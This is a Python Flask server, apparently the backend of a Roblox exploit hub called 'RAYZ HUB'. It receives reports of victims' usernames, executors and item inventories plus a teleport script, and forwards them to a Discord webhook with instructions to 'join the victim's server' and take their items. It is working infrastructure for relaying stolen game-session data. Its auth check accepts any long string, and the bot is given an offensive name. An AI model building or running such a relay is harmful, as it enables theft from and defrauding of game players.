from flask import Flask, request, jsonify
import requests
import os
import secrets
import re
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from datetime import datetime

app = Flask(__name__)

limiter = Limiter(
    get_remote_address,
    app=app,
    default_limits=None,
    storage_uri="memory://",
)

WEBHOOK_URL = os.environ.get("ETFB_WEBHOOK")
if not WEBHOOK_URL:
    raise ValueError("ETFB_WEBHOOK environment variable is not set!")

# ── Block patterns ──
PING_PATTERN = re.compile(r"@everyone|@here|<@&[0-9]+>", re.IGNORECASE)
INVITE_PATTERN = re.compile(
    r"(?:discord\.gg/|discord\.com/invite/|discordapp\.com/invite/)[a-zA-Z0-9]+",
    re.IGNORECASE
)

# ── Get dynamic auth key ──
@app.route("/noobhttpspy", methods=["GET"])
@limiter.limit("10 per minute")
def get_dynamic_key():
    dynamic_key = secrets.token_hex(16)
    return jsonify({
        "auth_key": dynamic_key,
        "message": "Use this in 'auth' field of your POST request"
    }), 200


# ── Main logging endpoint ──
@app.route("/log/etfb/<string:random_id>", methods=["POST"])
@limiter.limit("15 per minute")
def send_to_discord(random_id):
    try:
        data = request.get_json(force=True, silent=True)
        if not data:
            return jsonify({"error": "No JSON payload"}), 400

        # Auth check
        provided_key = data.get("auth")
        if not provided_key or not isinstance(provided_key, str) or len(provided_key) < 20:
            return jsonify({"error": "Missing or invalid auth key"}), 403

        # Token check
        if "token" not in data or not isinstance(data["token"], str) or len(data["token"]) < 10:
            return jsonify({"error": "Missing or invalid token"}), 403

        # ── Anti-abuse checks ──
        content = data.get("tp_script") or ""
        embeds = data.get("embeds", [])

        # Helper to check text for blocked patterns
        def is_blocked(text):
            return bool(PING_PATTERN.search(text) or INVITE_PATTERN.search(text))

        # Check main content
        if is_blocked(content):
            return jsonify({"error": "Blocked: pings, role mentions or invites not allowed"}), 403

        # Check embeds (title, description, field values)
        for embed in embeds if isinstance(embeds, list) else [embeds]:
            if not isinstance(embed, dict):
                continue

            # title & description
            for field in ["title", "description"]:
                text = embed.get(field, "")
                if is_blocked(text):
                    return jsonify({"error": "Blocked: embed pings, role mentions or invites"}), 403

            # field values
            for field in embed.get("fields", []):
                if not isinstance(field, dict):
                    continue
                value = field.get("value", "")
                if is_blocked(value):
                    return jsonify({"error": "Blocked: embed field pings, role mentions or invites"}), 403

        # ── Proceed with payload processing ──
        player_name   = str(data.get("player_name", "Unknown"))
        executor      = str(data.get("executor", "Unknown"))
        player_count  = str(data.get("player_count", "0"))
        max_players   = str(data.get("max_players", "??"))
        status_text   = str(data.get("status_text", "Unknown"))
        base_report   = str(data.get("base_report", "No items"))
        hit_status    = str(data.get("hit_status", "Unknown"))
        tp_script     = data.get("tp_script", None)

        color_raw = data.get("color", 0x800080)
        if isinstance(color_raw, str) and color_raw.startswith("0x"):
            try:
                color = int(color_raw, 16)
            except:
                color = 0x800080
        else:
            color = int(color_raw) if str(color_raw).isdigit() else 0x800080

        embed = {
            "title": f"RAYZ HUB | {hit_status}",
            "description": "join the victim's server, **chat**, **jump** or **get close** to the victim to get gifts.",
            "color": color,
            "fields": [
                {
                    "name": "<:rayz_check:1459279711774576846> __**`Status`**__",
                    "value": f"```{status_text}```",
                    "inline": False
                },
                {
                    "name": "<:rayz_info:1459657883846185021> __**`Info`**__",
                    "value": f"```\nUsername: {player_name}\nExecutor: {executor}\nPlayers: {player_count}/{max_players}```",
                    "inline": True
                },
                {
                    "name": "<:rayz_backpack:1459652540630171844> __**`Items`**__",
                    "value": f"```{base_report}```",
                    "inline": False
                }
            ],
            "footer": {
                "text": "RAYZ HUB",
                "icon_url": "https://rayzhubb.vercel.app/pngs/logo.png"
            },
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "image": {
                "url": "https://rayzhubb.vercel.app/pngs/etfb.png"
            }
        }

        discord_payload = {
            "content": tp_script if tp_script else None,
            "username": "jeffrey epstein",
            "avatar_url": "https://rayzhubb.vercel.app/pngs/logo.png",
            "embeds": [embed]
        }

        discord_payload = {k: v for k, v in discord_payload.items() if v is not None}

        resp = requests.post(
            WEBHOOK_URL,
            json=discord_payload,
            headers={"Content-Type": "application/json"},
            timeout=10
        )

        if resp.status_code in (200, 204):
            return jsonify({"status": "ok"}), 200
        else:
            return jsonify({
                "error": "Discord rejected the payload",
                "discord_status": resp.status_code,
                "discord_response": resp.text[:500]
            }), 502

    except Exception as e:
        return jsonify({"error": f"Server error: {str(e)}"}), 500


@app.route("/", methods=["GET"])
def health():
    return jsonify({"status": "alive"})


if __name__ == "__main__":
    app.run()